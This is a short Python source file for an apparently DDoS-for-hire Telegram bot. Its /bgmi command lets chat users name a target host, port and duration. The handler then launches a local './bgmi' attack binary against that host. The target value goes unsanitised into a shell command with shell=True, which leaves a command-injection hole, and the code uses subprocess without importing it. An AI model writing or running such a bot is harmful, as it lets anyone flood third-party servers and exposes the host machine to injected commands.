from . import bot
from .cooldown import check_cooldown
from .logging import log_command
from .utils import start_attack_reply

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if check_cooldown(user_id):
        bot.reply_to(message, "Cooldown active.")
        return
    command = message.text.split()
    if len(command) == 4:
        target, port, time = command[1], int(command[2]), int(command[3])
        log_command(user_id, "bgmi")
        start_attack_reply(message, target, port, time)
        subprocess.run(f"./bgmi {target} {port} {time} 300", shell=True)
    else:
        bot.reply_to(message, "Usage: /bgmi <target> <port> <time>")
